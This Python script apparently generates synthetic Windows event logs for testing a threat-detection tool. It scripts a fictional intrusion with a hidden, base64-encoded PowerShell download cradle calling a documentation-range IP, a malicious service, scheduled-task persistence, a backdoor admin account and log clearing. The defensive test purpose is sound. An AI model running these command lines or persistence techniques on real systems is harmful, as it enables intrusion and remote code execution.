"""Generate the synthetic sample logs in samples/.

Everything here is FICTIONAL: the host (WS-LAB-07), domain (LAB), user names
and IP addresses. Attacker IPs come from the documentation ranges
203.0.113.0/24 and 198.51.100.0/24 (RFC 5737), which are reserved for
examples and never routed on the internet.

The story (all times UTC, 30 Oct 2026):
  08:00-09:00  normal working activity (benign noise)
  09:15        user opens a phishing document: WINWORD spawns PowerShell
  13:58        attacker 203.0.113.45 brute-forces 'administrator' over RDP...
  14:01        ...and succeeds
  14:03        another attacker IP sprays 8 different accounts
  14:05        creates backdoor user 'support_tmp' and adds it to Administrators
  14:07        runs encoded PowerShell download cradle
  14:09        installs a malicious service
  14:10        creates a scheduled task for persistence
  14:12        clears the Security log

Run:  python scripts/generate_samples.py
"""

from __future__ import annotations

import base64
import hashlib
import json
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Any

HOST = "WS-LAB-07.lab.local"
DOMAIN = "LAB"
SECURITY = ("Security", "Microsoft-Windows-Security-Auditing")
SYSTEM_SCM = ("System", "Service Control Manager")
POWERSHELL = ("Microsoft-Windows-PowerShell/Operational", "Microsoft-Windows-PowerShell")
SYSMON = ("Microsoft-Windows-Sysmon/Operational", "Microsoft-Windows-Sysmon")

BASE = datetime(2026, 10, 30, tzinfo=timezone.utc)

PAYLOAD = "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.45/stage2.ps1')"
ENCODED = base64.b64encode(PAYLOAD.encode("utf-16-le")).decode("ascii")


def at(hh: int, mm: int, ss: int = 0) -> datetime:
    return BASE.replace(hour=hh, minute=mm, second=ss)


def ev(when: datetime, event_id: int, log: tuple[str, str], **data: Any) -> dict[str, Any]:
    """Build one record in the same shape as our PowerShell export one-liner."""
    channel, provider = log
    return {
        "EventID": event_id,
        "TimeCreated": when.strftime("%Y-%m-%dT%H:%M:%S.%f") + "0Z",  # 7 digits, like Windows
        "Computer": HOST,
        "Channel": channel,
        "Provider": provider,
        "EventData": {k: str(v) for k, v in data.items()},
    }


def fake_hash(text: str) -> str:
    return "SHA256=" + hashlib.sha256(text.encode()).hexdigest().upper()


def logon_failed(when: datetime, user: str, ip: str, logon_type: int = 3) -> dict[str, Any]:
    return ev(
        when, 4625, SECURITY,
        SubjectUserSid="S-1-0-0", SubjectUserName="-", SubjectDomainName="-",
        TargetUserName=user, TargetDomainName=DOMAIN,
        Status="0xc000006d", FailureReason="%%2313", SubStatus="0xc000006a",
        LogonType=logon_type, LogonProcessName="NtLmSsp", AuthenticationPackageName="NTLM",
        WorkstationName="-", IpAddress=ip, IpPort=49152 + when.second,
    )


def logon_ok(when: datetime, user: str, ip: str, logon_type: int, logon_id: str) -> dict[str, Any]:
    return ev(
        when, 4624, SECURITY,
        SubjectUserSid="S-1-5-18", SubjectUserName="WS-LAB-07$", SubjectDomainName=DOMAIN,
        TargetUserName=user, TargetDomainName=DOMAIN, TargetLogonId=logon_id,
        LogonType=logon_type, LogonProcessName="User32" if logon_type in (2, 10) else "NtLmSsp",
        AuthenticationPackageName="Negotiate" if logon_type == 2 else "NTLM",
        WorkstationName="WS-LAB-07", IpAddress=ip, IpPort=0 if ip in ("-", "127.0.0.1") else 50211,
        ElevatedToken="%%1842",
    )


def proc_4688(when: datetime, user: str, image: str, cmd: str, parent: str) -> dict[str, Any]:
    return ev(
        when, 4688, SECURITY,
        SubjectUserName=user, SubjectDomainName=DOMAIN, NewProcessName=image,
        NewProcessId="0x1a2c", CommandLine=cmd, TokenElevationType="%%1936",
        ParentProcessName=parent, MandatoryLabel="S-1-16-12288",
    )


def sysmon_1(when: datetime, user: str, image: str, cmd: str, parent: str, parent_cmd: str) -> dict[str, Any]:
    return ev(
        when, 1, SYSMON,
        RuleName="-", UtcTime=when.strftime("%Y-%m-%d %H:%M:%S.000"),
        ProcessGuid="{6f1c2a10-0000-0000-0000-000000000001}", ProcessId=4120,
        Image=image, CommandLine=cmd, CurrentDirectory="C:\\Users\\" + user.split("\\")[-1] + "\\Documents\\",
        User=user, LogonId="0x3e7a1", IntegrityLevel="Medium", Hashes=fake_hash(image),
        ParentProcessGuid="{6f1c2a10-0000-0000-0000-000000000002}", ParentProcessId=3880,
        ParentImage=parent, ParentCommandLine=parent_cmd,
    )


def task_xml(command: str, args: str) -> str:
    return (
        '<?xml version="1.0" encoding="UTF-16"?><Task version="1.2" '
        'xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"><Triggers><LogonTrigger>'
        "<Enabled>true</Enabled></LogonTrigger></Triggers><Actions Context=\"Author\"><Exec>"
        f"<Command>{command}</Command><Arguments>{args}</Arguments></Exec></Actions></Task>"
    )


def benign_events() -> list[dict[str, Any]]:
    """Normal activity that should NOT raise high/critical findings."""
    out: list[dict[str, Any]] = []
    # Morning logons
    out.append(logon_ok(at(8, 0, 5), "lab.user01", "-", 2, "0x3e7a1"))
    out.append(logon_ok(at(8, 2, 40), "analyst.demo", "-", 2, "0x3e8b2"))
    # A user mistypes their password twice on a file share, then succeeds (normal)
    out.append(logon_failed(at(8, 10, 1), "lab.user02", "10.0.0.15"))
    out.append(logon_failed(at(8, 10, 9), "lab.user02", "10.0.0.15"))
    out.append(logon_ok(at(8, 10, 20), "lab.user02", "10.0.0.15", 3, "0x4a001"))
    # Local console typo (no source IP) - must not count toward brute force
    for s in (1, 4, 8):
        out.append(logon_failed(at(8, 20, s), "lab.user01", "-", 2))
    # Normal process creation
    out.append(proc_4688(at(8, 5), "lab.user01", "C:\\Windows\\explorer.exe", "C:\\Windows\\Explorer.EXE",
                         "C:\\Windows\\System32\\userinit.exe"))
    out.append(proc_4688(at(8, 30), "lab.user01", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                         "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\\IT\\Scripts\\Get-DiskReport.ps1",
                         "C:\\Windows\\explorer.exe"))
    out.append(proc_4688(at(8, 31), "lab.user01", "C:\\Windows\\System32\\cmd.exe",
                         "cmd.exe /c ipconfig /all", "C:\\Windows\\explorer.exe"))
    # Benign PowerShell script block
    out.append(ev(at(8, 30, 2), 4104, POWERSHELL, MessageNumber=1, MessageTotal=1,
                  ScriptBlockText="Get-Volume | Where-Object { $_.SizeRemaining -lt 10GB } | Format-Table",
                  ScriptBlockId="7d1c7c55-1111-4c4c-9c9c-000000000001", Path="C:\\IT\\Scripts\\Get-DiskReport.ps1"))
    # Sysmon: Word opening the print spooler helper and the user opening Notepad
    out.append(sysmon_1(at(8, 45), "LAB\\lab.user01", "C:\\Windows\\splwow64.exe", "C:\\Windows\\splwow64.exe 12288",
                        "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
                        '"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" /n "C:\\Users\\lab.user01\\Documents\\Q3-budget.docx"'))
    out.append(sysmon_1(at(8, 50), "LAB\\lab.user01", "C:\\Windows\\System32\\notepad.exe", "notepad.exe todo.txt",
                        "C:\\Windows\\explorer.exe", "C:\\Windows\\Explorer.EXE"))
    # Legitimate software installs a service and an updater task (expected low/medium noise)
    out.append(ev(at(8, 55), 7045, SYSTEM_SCM, ServiceName="Contoso Backup Agent",
                  ImagePath='"C:\\Program Files\\Contoso\\Backup\\backupagent.exe"',
                  ServiceType="user mode service", StartType="auto start", AccountName="LocalSystem"))
    out.append(ev(at(8, 56), 4698, SECURITY, SubjectUserName="it.admin", SubjectDomainName=DOMAIN,
                  TaskName="\\Contoso\\BackupAgentUpdate",
                  TaskContent=task_xml("C:\\Program Files\\Contoso\\Backup\\updater.exe", "/silent")))
    # Admin adds a user to a NON-privileged group (should not alert)
    out.append(ev(at(9, 0), 4732, SECURITY, MemberName="-", MemberSid="S-1-5-21-1000-2000-3000-1105",
                  TargetUserName="Event Log Readers", TargetDomainName="Builtin", TargetSid="S-1-5-32-573",
                  SubjectUserName="it.admin", SubjectDomainName=DOMAIN))
    return out


def attack_events() -> list[dict[str, Any]]:
    """The intrusion story - every rule should fire at least once."""
    out: list[dict[str, Any]] = []
    attacker = "203.0.113.45"
    sprayer = "198.51.100.23"

    # 09:15 phishing: Word spawns hidden PowerShell (WTH-011 and WTH-007 via Sysmon 1)
    out.append(sysmon_1(
        at(9, 15, 12), "LAB\\analyst.demo",
        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        f"powershell.exe -nop -w hidden -ec {ENCODED}",
        "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
        '"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" /n "C:\\Users\\analyst.demo\\Downloads\\Invoice_8841.docm"',
    ))

    # 13:58 brute force over RDP-backed NTLM: 12 failures in ~2.5 minutes (WTH-001)
    start = at(13, 58, 0)
    for i in range(12):
        out.append(logon_failed(start + timedelta(seconds=13 * i), "administrator", attacker))
    # 14:01 success from same IP (WTH-002)
    out.append(logon_ok(at(14, 1, 2), "administrator", attacker, 10, "0x7f3a2"))

    # 14:03 password spray: 8 different users, one attempt each (WTH-003)
    for i, user in enumerate(["lab.user01", "lab.user02", "analyst.demo", "it.admin",
                              "backup_svc", "hr.kiosk", "reception", "scanner"]):
        out.append(logon_failed(at(14, 3, 5 * i), user, sprayer))

    # 14:05 backdoor account (WTH-004) and admin group membership (WTH-005)
    out.append(ev(at(14, 5, 10), 4720, SECURITY, TargetUserName="support_tmp", TargetDomainName="WS-LAB-07",
                  TargetSid="S-1-5-21-1000-2000-3000-1013", SubjectUserName="administrator",
                  SubjectDomainName=DOMAIN, SubjectLogonId="0x7f3a2", SamAccountName="support_tmp",
                  DisplayName="%%1793", UserAccountControl="%%2080"))
    out.append(ev(at(14, 5, 31), 4732, SECURITY, MemberName="-", MemberSid="S-1-5-21-1000-2000-3000-1013",
                  TargetUserName="Administrators", TargetDomainName="Builtin", TargetSid="S-1-5-32-544",
                  SubjectUserName="administrator", SubjectDomainName=DOMAIN, SubjectLogonId="0x7f3a2"))

    # 14:07 encoded PowerShell via process creation + script block logging (WTH-007 x2)
    out.append(proc_4688(at(14, 7, 0), "administrator",
                         "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                         f"powershell.exe -NoP -NonI -W Hidden -enc {ENCODED}",
                         "C:\\Windows\\System32\\cmd.exe"))
    out.append(ev(at(14, 7, 1), 4104, POWERSHELL, MessageNumber=1, MessageTotal=1, ScriptBlockText=PAYLOAD,
                  ScriptBlockId="0b9f4e2a-2222-4d4d-8e8e-000000000002", Path=""))

    # 14:09 malicious service (WTH-008 low + WTH-009 high)
    out.append(ev(at(14, 9, 44), 7045, SYSTEM_SCM, ServiceName="WinUpdateHelper",
                  ImagePath=f"%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -enc {ENCODED}",
                  ServiceType="user mode service", StartType="demand start", AccountName="LocalSystem"))

    # 14:10 scheduled task persistence (WTH-010)
    out.append(ev(at(14, 10, 15), 4698, SECURITY, SubjectUserName="administrator", SubjectDomainName=DOMAIN,
                  TaskName="\\Microsoft\\Windows\\UpdateCheck",
                  TaskContent=task_xml("powershell.exe", "-w hidden -File C:\\Users\\Public\\upd.ps1")))

    # 14:12 cover tracks (WTH-006). 1102 stores its fields under UserData/LogFileCleared.
    out.append({
        "EventID": 1102, "TimeCreated": at(14, 12, 3).strftime("%Y-%m-%dT%H:%M:%S.%f") + "0Z",
        "Computer": HOST, "Channel": "Security", "Provider": "Microsoft-Windows-Eventlog",
        "EventData": {"SubjectUserSid": "S-1-5-21-1000-2000-3000-500", "SubjectUserName": "administrator",
                      "SubjectDomainName": DOMAIN, "SubjectLogonId": "0x7f3a2"},
    })
    return out


def write_jsonl(path: Path, records: list[dict[str, Any]]) -> None:
    records = sorted(records, key=lambda r: r["TimeCreated"])
    path.write_text("".join(json.dumps(r) + "\n" for r in records), encoding="utf-8")
    print(f"wrote {len(records)} events -> {path}")


def main() -> None:
    samples = Path(__file__).resolve().parents[1] / "samples"
    samples.mkdir(exist_ok=True)
    write_jsonl(samples / "sample_events.jsonl", benign_events() + attack_events())
    write_jsonl(samples / "benign_only.jsonl", benign_events())


if __name__ == "__main__":
    main()
